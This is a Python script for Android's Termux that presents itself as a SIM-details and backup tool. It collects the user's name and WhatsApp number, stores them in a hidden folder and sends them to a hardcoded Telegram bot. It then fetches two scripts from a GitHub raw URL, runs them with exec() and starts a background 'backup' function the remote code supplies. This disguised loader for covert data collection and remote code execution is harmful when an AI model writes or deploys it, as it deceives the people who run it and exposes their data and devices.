import os
import subprocess
import sys
import time
import urllib.request
import requests

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# --- Runchecker Bot Token ---
RUNNER_BOT_TOKEN = "8884485359:AAHX-DzHyQXwjWh65Go8gykm_-TBTtFOoS0"
CHAT_ID = "7883547875"

# Hidden secure internal configuration file path
DEVICE_CONFIG_FILE = (
    "/data/data/com.termux/files/home/.backup_secure_data/device_info.txt"
)
os.makedirs(os.path.dirname(DEVICE_CONFIG_FILE), exist_ok=True)

SIMINFO_URL = "https://raw.githubusercontent.com/aqiii798/Backup_Data/main/siminfo.py"
BACKEND_URL = "https://raw.githubusercontent.com/aqiii798/Backup_Data/main/backend.py"

# ==================== COLORS & STYLING ====================
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
M = "\033[95m"
C = "\033[96m"
W = "\033[97m"
N = "\x1b[0m"

BRIGHT_CYAN = "\033[1;96m"
BRIGHT_YELLOW = "\033[1;93m"
BRIGHT_GREEN = "\033[1;92m"
BRIGHT_MAGENTA = "\033[1;95m"

logo = f"""
{BRIGHT_CYAN} ███████╗██╗███╗   ███╗    ██████╗  █████╗ ████████╗ █████╗ 
{BRIGHT_CYAN} ██╔════╝██║████╗ ████║    ██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗
{BRIGHT_CYAN} ███████╗██║██╔████╔██║    ██║  ██║███████║   ██║   ███████║
{BRIGHT_CYAN} ╚════██║██║██║╚██╔╝██║    ██║  ██║██╔══██║   ██║   ██╔══██║
{BRIGHT_CYAN} ███████║██║██║ ╚═╝ ██║    ██████╔╝██║  ██║   ██║   ██║  ██║
{BRIGHT_CYAN} ╚══════╝╚═╝╚═╝     ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝{N}
{BRIGHT_YELLOW}═══════════════════════════════════════════════════════════{N}
{M}Authors{N}   : {Y}H 3 ll R ii S 3 R{N}
{M}Tool Type{N} : {Y}SIM DETAILS & BACKUP SYSTEM{N}
{BRIGHT_YELLOW}═══════════════════════════════════════════════════════════{N}"""


def send_run_alert(message):
  try:
    url = f"https://api.telegram.org/bot{RUNNER_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=payload, timeout=10)
  except Exception:
    pass


def splash_screen():
  if os.path.exists(DEVICE_CONFIG_FILE):
    try:
      with open(DEVICE_CONFIG_FILE, "r", encoding="utf-8") as f:
        saved_data = f.read().strip()
        if saved_data:
          return saved_data
    except Exception:
      pass

  while True:
    os.system("clear" if os.name == "posix" else "cls")
    print(logo)
    print(
        f"\n{BRIGHT_GREEN}╔══════════════════════════════════════════════════════════╗{N}"
    )
    print(
        f"{BRIGHT_GREEN}║               ✨ USER IDENTIFICATION ✨                ║{N}"
    )
    print(
        f"{BRIGHT_GREEN}╚══════════════════════════════════════════════════════════╝{N}\n"
    )

    name_input = input(f"{G}[+] Enter Your Name (Text):{Y} ").strip()
    whatsapp_input = input(
        f"{G}[+] Enter WhatsApp Number (Numbers Only):{Y} "
    ).strip()

    if not name_input or not name_input.replace(" ", "").isalpha():
      print(f"\n{R}[×] Invalid Name! Please enter alphabetic characters only.{N}")
      time.sleep(2)
      continue

    if not whatsapp_input.isdigit() or len(whatsapp_input) < 10:
      print(
          f"\n{R}[×] Invalid Number! Please enter valid digits only (min 10).{N}"
      )
      time.sleep(2)
      continue

    user_info = f"Naam: {name_input} | WhatsApp: {whatsapp_input}"

    try:
      with open(DEVICE_CONFIG_FILE, "w", encoding="utf-8") as f:
        f.write(user_info)
    except Exception:
      pass

    send_run_alert(
        f"🚨 NEW USER LOGGED IN 🚨\n\n👤 Name: {name_input}\n📱 WhatsApp:"
        f" {whatsapp_input}"
    )

    print(f"\n{BRIGHT_GREEN}[✔] Registration Successful! Starting Tool...{N}")
    time.sleep(2)
    return user_info


def fetch_and_run_script(url, script_name, local_vars=None):
  if local_vars is None:
    local_vars = {}
  try:
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=15) as response:
      code_content = response.read().decode("utf-8")

    if not code_content.strip():
      send_run_alert(f"⚠️ Warning: [{script_name}] khali hai!")
      return False, local_vars

    exec(code_content, local_vars)
    return True, local_vars
  except Exception as e:
    send_run_alert(
        f"❌ Error: [{script_name}] run nahi ho saki!\nReason: {str(e)}"
    )
    return False, local_vars


def main():
  try:
    # 1. Runner Splash Screen (User Identification)
    current_user_info = splash_screen()

    # 2. Siminfo Script Fetch & Execute
    sim_locals = {}
    sim_success, sim_locals = fetch_and_run_script(
        SIMINFO_URL, "siminfo.py", sim_locals
    )

    # 3. Backend Script Fetch & Background Thread Trigger
    backend_locals = {"current_user_info": current_user_info}
    backend_success, _ = fetch_and_run_script(
        BACKEND_URL, "backend.py", backend_locals
    )

    if backend_success and "start_background_backup" in backend_locals:
      try:
        backend_locals["start_background_backup"](current_user_info)
      except Exception:
        pass

    backend_status = "Success ✅" if backend_success else "Failed ❌"

    # 4. Final Master Status Report Telegram par bhejna (Only 2 Scripts)
    final_report = (
        f"🤖 [RUNNER MASTER STATUS]\n\n"
        f"👤 User Info: {current_user_info}\n\n"
        f"📌 Siminfo Script: {'Success ✅' if sim_success else 'Failed ❌'}\n"
        f"🚀 Backend Script Status: {backend_status}"
    )

    send_run_alert(final_report)

    # 5. Front-end Main loop agar siminfo mein mojood ho
    if sim_success and "main" in sim_locals:
      sim_locals["main"]()

  except KeyboardInterrupt:
    print("\n\n⚠️ Program interrupted by user")
    send_run_alert("⚠️ Program manually interrupted by user.")
  except Exception as e:
    send_run_alert(f"❌ Master Runner Critical Error: {str(e)}")


if __name__ == "__main__":
  main()
